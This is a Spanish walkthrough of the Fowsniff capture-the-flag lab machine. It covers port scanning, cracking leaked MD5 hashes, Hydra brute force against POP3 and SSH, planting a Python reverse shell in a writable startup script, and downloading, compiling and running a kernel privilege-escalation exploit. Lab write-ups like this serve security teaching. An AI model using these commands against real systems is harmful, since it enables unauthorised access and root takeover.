<h1 align="center">Fowsniff CTF</h1>

# ÍNDICE

# INTRODUCCIÓN

Una máquina perfecta para principiantes!

Para empezar haremos un test de conectividad.

```
ping <ip>
```

Posteriormente un escaner con "nmap"

```
sudo nmap -sCV -T4 --min-rate 4000 <ip>
```

![image](https://github.com/user-attachments/assets/fe4619f1-4641-444c-80e4-722145d894a3)

Viendo esta información nos encontramos con:

- Puerto 22 abierto : SSH
- Puerto 80 abierto : HTTP
- Puerto 110 abierto : POP3 (No cifrado)
- Puerto 143 abierto : IMAP

Buscando información en google sobre estas personas en contramos un pastebin con sus contraseñas y emails hasehados en MD5

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

 Podemos utilizar "Crackstation" o por supuesto "john" pero tardaremos menos con la otra

 ![image](https://github.com/user-attachments/assets/a84bf95a-3d20-49c0-9fe9-5e1a0bb41337)

En este caso podemos ir por dos vectores, ya que tenemos contraseñas hasehadas pordemos intentar hacer un inicio de fuerza burta al pop3 o al ssh con hydra

Para empezar deberemos crear dos wordlist con los usuarios y con las contraseñas.

```
hydra -L user.txt -P pass.txt -f 10.10.202.207 -s 110 pop3
```

![image](https://github.com/user-attachments/assets/faa7c163-e95e-44c1-978a-ea3ce76bfea0)

Encontramos una cuenta con la capacidad de poder iniciar sesión probremos.

```
nc <ip> <puerto>

USER ####
PASS ####

LIST

retr 1
```

Nos encontramos con un correo en el que nos dice que un hacker inicio sesion en su correo interno.

![image](https://github.com/user-attachments/assets/95cc3831-a917-4a7c-96ac-456d563d518c)

Nos encontramos con un contraseña en SSH probemos si funciona. Teniendo todos los usuarios.

```
hydra -L user.txt -P uno.txt -f 10.10.202.207 -s 22 ssh
```

![image](https://github.com/user-attachments/assets/4ddd2fc5-b811-4a76-a605-416269c67cf9)

Lo conseguimos vamos dentro del ssh

![image](https://github.com/user-attachments/assets/c790f60b-998e-4137-b703-dc72a2ddd3a9)

Si exploramos un poco nos encontramos en el grupo (baksteen)

![image](https://github.com/user-attachments/assets/6d5fdb0d-4f54-45a7-8080-8c095d6bbee4)

Vamos a filtrar a ver que podemos ejecutar con este grupo.

```
find / -group users 2>/dev/null
```

Nos encontramos que el grupo realmente importante es "users" y nos encontramos en la ruta /opt/cube un archivo importante.

![image](https://github.com/user-attachments/assets/367c9333-d8c9-4567-9bfa-08386ebec535)

Podemos editarlo para generar una rev shell y conectarnos con dichos permisos 

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Tenemos otra vulnerabilidad tambien importante que podemos escalar privilegios y es desde el mismo kernel

```
cd /var/www/html
wget https://www.exploit-db.com/download/44298
mv 44298 44298.c
gcc 44298.c -o exploit
/etc/init.d/apache2 start
ifconfig
```

```
cd /tmp
wget <ip>/exploit
chmod +x exploit
./exploit
```

![image](https://github.com/user-attachments/assets/237cc1ff-3d60-4d15-8c0c-b172d883b589)

GG!!






